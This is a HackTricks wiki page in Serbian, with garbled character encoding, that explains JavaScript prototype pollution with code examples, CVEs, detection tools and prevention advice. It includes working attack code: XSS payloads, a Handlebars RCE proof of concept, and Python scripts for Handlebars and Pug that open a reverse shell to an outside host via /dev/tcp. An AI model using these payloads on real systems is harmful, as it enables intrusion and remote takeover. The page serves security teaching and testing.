# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Objekti u JavaScript-u <a href="#id-053a" id="id-053a"></a>

Objekti u JavaScript-u su suÅ¡tinski kolekcije parova kljuÄ-vrednost, poznate kao svojstva. Objekat se moÅ¾e kreirati koriÅ¡Ä‡enjem `Object.create` sa `null` kao argumentom kako bi se proizveo prazan objekat. Ovaj metod omoguÄ‡ava kreiranje objekta bez ikakvih nasleÄ‘enih svojstava.
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
### Funkcije i klase u JavaScript-u

U JavaScript-u, klase i funkcije su blisko povezane, pri Äemu funkcije Äesto sluÅ¾e kao konstruktori za klase. Uprkos nedostatku podrÅ¡ke za nativne klase u JavaScript-u, konstruktori mogu emulirati ponaÅ¡anje klasa.
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### Prototipovi u JavaScript-u

JavaScript omoguÄ‡ava modifikaciju, dodavanje ili brisanje prototipnih atributa tokom izvrÅ¡avanja. Ova fleksibilnost omoguÄ‡ava dinamiÄko proÅ¡irenje funkcionalnosti klase.

Funkcije poput `toString` i `valueOf` mogu biti izmenjene kako bi se promenilo njihovo ponaÅ¡anje, Å¡to pokazuje prilagodljivu prirodu JavaScript-ovog prototipnog sistema.

## NasleÄ‘ivanje

U programiranju zasnovanom na prototipovima, svojstva/metode se nasleÄ‘uju od objekata iz klasa. Ove klase se kreiraju dodavanjem svojstava/metoda ili instanci druge klase ili praznom objektu.

VaÅ¾no je napomenuti da kada se svojstvo doda objektu koji sluÅ¾i kao prototip za druge objekte (kao Å¡to je `myPersonObj`), nasleÄ‘eni objekti dobijaju pristup ovom novom svojstvu. MeÄ‘utim, ovo svojstvo se ne prikazuje automatski osim ako nije eksplicitno pozvano.

## ZagaÄ‘enje \_\_proto\_\_ <a href="#id-0d0a" id="id-0d0a"></a>

## IstraÅ¾ivanje ZagaÄ‘enja Prototipa u JavaScript-u

JavaScript objekti su definisani parovima kljuÄ-vrednost i nasleÄ‘uju se od JavaScript Object prototipa. To znaÄi da izmena Object prototipa moÅ¾e uticati na sve objekte u okruÅ¾enju.

Hajde da koristimo drugi primer kako bismo ilustrovali:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
Pristup Prototipu objekta je moguÄ‡ preko:
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
Dodavanjem svojstava u Object prototype, svaki JavaScript objekat Ä‡e naslediti ova nova svojstva:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## zagaÄ‘enje prototipa

Za scenarij u kojem je upotreba `__proto__` ograniÄena, izmena prototipa funkcije je alternativa:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
Ovo utiÄe samo na objekte kreirane iz konstruktora `Vehicle`, dajuÄ‡i im osobine `beep`, `hasWheels`, `honk` i `isElectric`.

Dva naÄina za globalno uticanje na JavaScript objekte putem zagaÄ‘enja prototipa ukljuÄuju:

1. ZagaÄ‘ivanje `Object.prototype` direktno:
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. ZagaÄ‘ivanje prototipa konstruktora za Äesto koriÅ¡Ä‡enu strukturu:
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
Nakon ovih operacija, svaki JavaScript objekat moÅ¾e izvrÅ¡iti `goodbye` i `greet` metode.

## ZagaÄ‘ivanje drugih objekata

### Od klase do Object.prototype

U scenariju gde moÅ¾ete **zagaÄ‘ivati odreÄ‘eni objekat** i trebate **dostiÄ‡i `Object.prototype`** moÅ¾ete pretraÅ¾iti sa neÄim sliÄnim sledeÄ‡em kodu:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### ZagaÄ‘enje elemenata niza

Imajte na umu da, kako moÅ¾ete zagaÄ‘ivati atribute objekata u JS-u, ako imate pristup zagaÄ‘ivanju niza, takoÄ‘e moÅ¾ete **zagaÄ‘ivati vrednosti niza** koje su dostupne **putem indeksa** (imajte na umu da ne moÅ¾ete prepisati vrednosti, pa morate zagaÄ‘ivati indekse koji se na neki naÄin koriste, ali nisu pisani).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### ZagaÄ‘enje HTML elemenata

Prilikom generisanja HTML elementa putem JS-a moguÄ‡e je **prepisati** atribut **`innerHTML`** kako bi se napisao **proizvoljan HTML kod.** [Idea and example from this writeup](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Primeri

### Osnovni primer

Do protoÄna zagaÄ‘enja dolazi zbog greÅ¡ke u aplikaciji koja omoguÄ‡ava prepisivanje svojstava na `Object.prototype`. To znaÄi da poÅ¡to veÄ‡ina objekata izvodi svoja svojstva iz `Object.prototype`

Najjednostavniji primer je dodavanje vrednosti **nedefinisanom atributu objekta** koji Ä‡e biti proveren, kao Å¡to je:
```javascript
if (user.admin) {
```
Ako je atribut **`admin` nedefinisan**, moguÄ‡e je zloupotrebiti PP i postaviti ga na True neÄim poput:
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
Mehanizam iza ovoga ukljuÄuje manipulisanje svojstvima tako da ako napadaÄ ima kontrolu nad odreÄ‘enim ulazima, mogu izmeniti prototip svih objekata u aplikaciji. Ova manipulacija obiÄno ukljuÄuje postavljanje svojstva `__proto__`, koje je u JavaScript-u sinonim za direktno modifikovanje prototipa objekta.

Uslovi pod kojima se ovaj napad moÅ¾e uspeÅ¡no izvrÅ¡iti, kako je navedeno u specifiÄnoj [studiji](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf), ukljuÄuju:

* IzvoÄ‘enje rekurzivnog spajanja.
* Definisanje svojstava na osnovu putanje.
* Kloniranje objekata.

### Pregaziti funkciju
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto ZagaÄ‘enje do RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

Drugi payload-ovi:

* [https://github.com/KTH-LangSec/server-side-prototype-pollution](https://github.com/KTH-LangSec/server-side-prototype-pollution)

## Klijentsko proto zagaÄ‘enje do XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019â€“11358: Napad proto zagaÄ‘enjem putem jQuery $ .extend

[Za dalje detalje pogledajte ovaj Älanak](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7) U jQuery-u, funkcija `$ .extend` moÅ¾e dovesti do proto zagaÄ‘enja ako se duboka kopija koristi nepravilno. Ova funkcija se obiÄno koristi za kloniranje objekata ili spajanje svojstava iz podrazumevanog objekta. MeÄ‘utim, kada je pogreÅ¡no konfigurisana, svojstva namenjena novom objektu mogu biti dodeljena prototipu umesto toga. Na primer:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
Ova ranjivost, identifikovana kao CVE-2019â€“11358, ilustruje kako duboka kopija moÅ¾e nenamerno izmeniti prototip, dovodeÄ‡i do potencijalnih sigurnosnih rizika, kao Å¡to je neovlaÅ¡Ä‡en pristup adminu ako se svojstva poput `isAdmin` provere bez odgovarajuÄ‡e provere postojanja.

### CVE-2018â€“3721, CVE-2019â€“10744: Napad prototipom kroz lodash

[Za dalje detalje pogledajte ovaj Älanak](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash) je naiÅ¡ao na sliÄne ranjivosti prototipa (CVE-2018â€“3721, CVE-2019â€“10744). Ovi problemi su reÅ¡eni u verziji 4.17.11.

### JoÅ¡ jedan tutorijal sa CVE-ovima

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### Alati za otkrivanje Prototip Pollution

* [**Server-Side-Prototype-Pollution-Gadgets-Scanner**](https://github.com/doyensec/Server-Side-Prototype-Pollution-Gadgets-Scanner): Burp Suite ekstenzija dizajnirana za otkrivanje i analizu ranjivosti prototipa zagaÄ‘enja na serverskoj strani u veb aplikacijama. Ovaj alat automatizuje proces skeniranja za identifikaciju potencijalnih problema sa prototipom zagaÄ‘enja. IskoriÅ¡Ä‡ava poznate gedÅ¾ete - metode za iskoriÅ¡Ä‡avanje prototipnog zagaÄ‘enja radi izvoÄ‘enja Å¡tetnih radnji - posebno se fokusirajuÄ‡i na Node.js biblioteke.
* [**server-side-prototype-pollution**](https://github.com/portswigger/server-side-prototype-pollution): Ova ekstenzija identifikuje ranjivosti prototipa zagaÄ‘enja na serverskoj strani. Koristi tehnike opisane u [prototipu zagaÄ‘enja na serverskoj strani](https://portswigger.net/research/server-side-prototype-pollution).

### AST Prototip Pollution u NodeJS-u

NodeJS intenzivno koristi Apstraktne Sintaksne Stabla (AST) u JavaScript-u za funkcionalnosti poput maÅ¡ina za Å¡ablone i TypeScript-a. Ova sekcija istraÅ¾uje ranjivosti povezane sa prototipom zagaÄ‘enja u maÅ¡inama za Å¡ablone, posebno Handlebars i Pug.

#### Analiza Ranjivosti Handlebars-a

MaÅ¡ina za Å¡ablone Handlebars je podloÅ¾na napadu prototipom zagaÄ‘enja. Ova ranjivost proizilazi iz specifiÄnih funkcija unutar fajla `javascript-compiler.js`. Na primer, funkcija `appendContent` konkatenira `pendingContent` ako je prisutna, dok funkcija `pushSource` resetuje `pendingContent` na `undefined` nakon dodavanja izvora.

**Proces eksploatacije**

Eksploatacija koristi AST (Apstraktno Sintaksno Stablo) koje proizvodi Handlebars, sledeÄ‡i ove korake:

1. **Manipulacija Parserom**: Prvo, parser, putem Ävora `NumberLiteral`, nameÄ‡e da vrednosti budu numeriÄke. Prototipno zagaÄ‘enje moÅ¾e zaobiÄ‡i ovo, omoguÄ‡avajuÄ‡i umetanje ne-numeriÄkih nizova.
2. **Obrada od strane Kompajlera**: Kompajler moÅ¾e obraditi AST objekat ili string Å¡ablona. Ako `input.type` jednak `Program`, ulaz se tretira kao prethodno parsiran, Å¡to moÅ¾e biti iskoriÅ¡Ä‡eno.
3. **Umetanje Koda**: Kroz manipulaciju `Object.prototype`, moÅ¾e se ubaciti proizvoljan kod u funkciju Å¡ablona, Å¡to moÅ¾e dovesti do izvrÅ¡enja udaljenog koda.

Primer koji demonstrira eksploataciju ranjivosti Handlebars-a:
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
Ovaj kod prikazuje kako napadaÄ moÅ¾e ubaciti proizvoljni kod u Handlebars predloÅ¾ak.

**Spoljni Reference**: Problem povezan sa zagaÄ‘enjem prototipa pronaÄ‘en je u 'flat' biblioteci, kako je detaljno opisano ovde: [Issue on GitHub](https://github.com/hughsk/flat/issues/105).

**Spoljni Reference**: [Problem povezan sa zagaÄ‘enjem prototipa u 'flat' biblioteci](https://github.com/hughsk/flat/issues/105)

Primer eksploatacije zagaÄ‘enja prototipa u Pythonu:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Pug Vulnerability

Pug, joÅ¡ jedan Å¡ablonski motor, suoÄava se sa sliÄnim rizikom od zagaÄ‘enja prototipa. Detaljne informacije dostupne su u diskusiji o [AST Injection in Pug](https://blog.p6.is/AST-Injection/#Pug).

Primer zagaÄ‘enja prototipa u Pugu:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### Preventivne mere

Da biste smanjili rizik od zagaÄ‘enja prototipa, mogu se primeniti strategije navedene u nastavku:

1. **Nepromenljivost objekata**: `Object.prototype` moÅ¾e se uÄiniti nepromenljivim primenom `Object.freeze`.
2. **Validacija unosa**: JSON unosi treba rigorozno validirati prema Å¡emi aplikacije.
3. **Funkcije sigurnog spajanja**: Treba izbegavati nebezbednu upotrebu rekurzivnih funkcija spajanja.
4. **Objekti bez prototipa**: Objekti bez prototipnih svojstava mogu se kreirati koriÅ¡Ä‡enjem `Object.create(null)`.
5. **KoriÅ¡Ä‡enje mape**: Umesto `Object`, treba koristiti `Map` za Äuvanje parova kljuÄ-vrednost.
6. **AÅ¾uriranje biblioteka**: Bezbednosni zakrpi mogu se ukljuÄiti redovnim aÅ¾uriranjem biblioteka.
7. **Linter i alati za statiÄku analizu**: Koristite alate poput ESLint sa odgovarajuÄ‡im dodacima za otkrivanje i spreÄavanje ranjivosti zagaÄ‘enja prototipa.
8. **Pregled koda**: Sprovedite temeljne preglede koda kako biste identifikovali i otklonili potencijalne rizike povezane sa zagaÄ‘enjem prototipa.
9. **Obuka o bezbednosti**: Edukujte programere o rizicima zagaÄ‘enja prototipa i najboljim praksama za pisanje bezbednog koda.
10. **PaÅ¾ljivo koriÅ¡Ä‡enje biblioteka**: Budite oprezni prilikom koriÅ¡Ä‡enja biblioteka treÄ‡ih strana. Procenite njihovu bezbednosnu postavku i pregledajte njihov kod, posebno one koji manipuliÅ¡u objektima.
11. **ZaÅ¡tita tokom izvrÅ¡avanja**: Koristite mehanizme zaÅ¡tite tokom izvrÅ¡avanja poput koriÅ¡Ä‡enja npm paketa fokusiranih na bezbednost koji mogu otkriti i spreÄiti napade zagaÄ‘enjem prototipa.

## Reference

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi** ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
